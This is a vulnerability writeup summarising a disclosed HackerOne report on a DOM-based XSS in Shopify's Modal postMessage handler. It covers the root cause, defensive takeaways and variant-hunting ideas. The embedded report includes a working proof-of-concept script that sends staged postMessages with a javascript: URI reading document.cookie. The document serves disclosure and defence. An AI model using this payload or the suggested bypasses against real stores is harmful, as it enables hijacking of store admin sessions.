# DOM XSS via Shopify.API.Modal.initialize PostMessage Handler

## Metadata
- **Source:** HackerOne
- **Report:** 602767 | https://hackerone.com/reports/602767
- **Submitted:** 2019-06-07
- **Reporter:** tiago-danin
- **Program:** Shopify
- **Bounty:** Not specified in writeup
- **Severity:** high
- **Vuln:** Cross-Site Scripting (XSS), DOM-based XSS, Unsafe PostMessage Handler, Improper Input Validation
- **CVEs:** None
- **Category:** web-api

## Summary
A DOM-based XSS vulnerability exists in Shopify's Modal initialization function that improperly handles postMessage events without sanitizing the 'src' parameter. An attacker can craft a malicious payload that executes arbitrary JavaScript in the context of the admin panel by sending multiple crafted postMessages to a newly opened admin window.

## Attack scenario
1. Attacker crafts a malicious webpage containing JavaScript that opens the Shopify admin themes page in a new window context
2. The attacker sends a postMessage with message type 'Shopify.API.Modal.initialize' containing an empty 'src' parameter to bypass initial checks
3. The attacker sends a second postMessage with the same message type but with 'src' set to a javascript: URI payload (e.g., 'javascript:alert(document.cookie)')
4. The modal initialization function processes the second message and uses the 'src' value to create a modal element, executing the injected JavaScript
5. The JavaScript payload executes in the admin context with full access to session cookies and admin functionality
6. Attacker gains ability to perform unauthorized actions on the victim's Shopify store, such as modifying themes, settings, or customer data

## Root cause
The Shopify.API.Modal.initialize postMessage handler fails to properly validate and sanitize the 'src' parameter before using it in DOM operations. The function likely directly assigns the src value to an iframe or similar element without checking for javascript: protocols or other dangerous values. The dual-payload technique exploits potential caching or lazy validation where an empty first message passes validation before a malicious payload is injected.

## Attacker mindset
An attacker would recognize that postMessage handlers are common attack vectors when not properly secured. By studying similar CVEs (#422043, #576532), the attacker identifies a pattern of insufficient validation in Shopify's modal initialization. The staged payload approach (empty then malicious) suggests the attacker is bypassing potential server-side or client-side validation logic that may only validate on initial message receipt.

## Defensive takeaways
- Implement strict allowlist validation for all postMessage handlers - only accept expected message types and validate all data parameters
- Never use untrusted data in javascript: URIs, eval(), innerHTML, or other dangerous contexts without explicit sanitization
- For iframe src attributes, use a Content Security Policy to restrict javascript: protocols and enforce HTTPS only
- Validate and sanitize user-controlled input on every handler invocation, not just initial setup
- Consider using iframe sandboxing attributes to restrict capabilities regardless of src content
- Implement origin validation for postMessage to ensure messages only come from trusted sources
- Use a security linter or static analysis to detect unsafe DOM manipulation patterns

## Variant hunting
Search for other postMessage handlers in Shopify codebase that accept 'src' or 'url' parameters - likely similar vuln patterns
Test other Shopify.API.* methods that accept data via postMessage for similar validation gaps
Look for modal/iframe initialization functions across other Shopify surfaces (e.g., sales channels, apps, embedded sections)
Test polyglot payloads combining data: URIs, blob: URIs, and protocol handlers beyond javascript:
Investigate whether the validation occurs at message receipt or during modal rendering - may reveal similar timing-based bypasses
Test with different postMessage serialization methods (JSON.stringify variations) to bypass parsing-based filters

## MITRE ATT&CK
- T1190
- T1199
- T1566.002

## Notes
This is a post-message based XSS rather than traditional reflected/stored XSS, making it particularly dangerous for embedded app contexts. The reference to similar bugs (#422043, #576532) suggests Shopify has had recurring issues with postMessage validation, indicating systemic architectural problems rather than isolated bugs. The attack requires user interaction (clicking a link), reducing severity slightly but not eliminating it given the admin context target.

## Full report
<details><summary>Expand</summary>

Similar #422043 & #576532

Payload ( Based on #576532): 

```html
<script>
    function attack(){
        const ctx = window.open(location.origin+'/admin/themes', '_blank')
        const json = {
            message: "Shopify.API.Modal.initialize",
            data: {
                src: ""
            }
        }

        let interval;
        interval = setInterval(function(){
            if (window.attackSuccess) {
                clearInterval(interval)
            } else {
                ctx.postMessage(JSON.stringify(json)) // data.src == ""
                json.data.src = "javascript:alert(document.cookie)"
                ctx.postMessage(JSON.stringify(json))
            }
        }, 500)
    }
    attack()
</script>
<a href="javascript:attack()" style="display:block;text-align:center;width:100%;height:300px;line-height:300px;background:#000;color:#fff;">click me start attack</a>
```

## Impact

Perform unauthorized actions on a store admin on any embedded apps.

</details>

---
*Analysed by Claude on 2026-05-12*
